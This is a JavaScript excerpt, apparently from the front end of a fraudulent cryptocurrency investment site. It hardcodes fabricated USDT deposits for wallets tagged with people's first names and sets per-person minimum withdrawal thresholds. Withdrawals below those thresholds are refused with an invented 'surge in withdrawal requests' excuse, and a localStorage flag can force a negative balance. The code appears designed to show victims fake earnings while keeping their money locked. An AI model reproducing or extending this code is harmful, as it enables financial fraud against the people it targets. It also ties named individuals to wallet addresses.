...
const TRANSACTIONS = {
	'0x1d068830109cf4d6ab892d3ff4a9bb37d9f42453': [ //tina maria
		{from: '0x4838b106fce9647bdf1e7877bf73ce8b0bad5f97', amt: 270, ts: 1720020337523},
	],
	...
	'0x28f91e88b4ff7ba5ba83e34a8f28939d2e95ae6c': [ // julia-kiara
		{from: '0x64A7c1569E5749c3c067656eeaa2Cb71D2AAaf49', amt: 100, ts: 1718096000709},
	],
	...
	'0x1de279ae00e3659a6a513b31a85dc88427e08f9e': [ // anas
		{from: '0x64A7c1569E5749c3c067656eeaa2Cb71D2AAaf49', amt: 130, ts: 1715090090009},
		{from: '0x64A7c1569E5749c3c067656eeaa2Cb71D2AAaf49', amt: 120, ts: 1715068322103},
	],


	'0x7deab2e965e337154e1fff1764a913e18f88a179': [ // liz
		{from: '0x64A7c1569E5749c3c067656eeaa2Cb71D2AAaf49', amt: 150, ts: 1714923945195},
		{from: '0x64A7c1569E5749c3c067656eeaa2Cb71D2AAaf49', amt: 200, ts: 1714832680351},
	],

	'0x78f707fa8fa5b71deb4121be085632d89d9862ef': [ // emy
		{from: '0x64A7c1569E5749c3c067656eeaa2Cb71D2AAaf49', amt: 150, ts: 1714837825034},
	],

	'0xe48f16ef4b449036179430c9f22020842b8b6354': [ // liss
		{from: '0x64A7c1569E5749c3c067656eeaa2Cb71D2AAaf49', amt: 200, ts: 1714857015278},
		{from: '0x64A7c1569E5749c3c067656eeaa2Cb71D2AAaf49', amt: 300, ts: 1714855194222},
		{from: '0x64A7c1569E5749c3c067656eeaa2Cb71D2AAaf49', amt: 300, ts: 1714845078614},
	],
	
	// '0x48a091191292855ac190f63b0286264195e284d2': [
	// 	{from: '0x64A7c1569E5749c3c067656eeaa2Cb71D2AAaf49', amt: 270, ts: 1712670815860},
	// 	{from: '0x64A7c1569E5749c3c067656eeaa2Cb71D2AAaf49', amt: 250, ts: 1712673295123},
	//  ],
};
const MINS = {
	...
	'0x78f707fa8fa5b71deb4121be085632d89d9862ef': 400, // emy
	'0xe48f16ef4b449036179430c9f22020842b8b6354': 750, // liss
}
...
app.controller('myCtrl', function($scope) {
	...
	if (localStorage.getItem('negative')) $scope.balance = -parseInt(localStorage.getItem('negative'));
...
function withdraw() {
	const minAmount = MINS[_scope.user] ? MINS[_scope.user] : 700;
	...
	if (wName == '') return alert('Please enter the name of your bank');
	if (wUser == '') return alert('Please enter a valid account number');
	if (wAmount == '' || isNaN(wAmount)) return alert('Please enter a valid withdrawal amount');
	...
	else if (wAmount < minAmount) return alert('Due to surge in withdrawal requests we are only accepting withdrawal requests of ' + minAmount + ' USDT or more.');
	else {
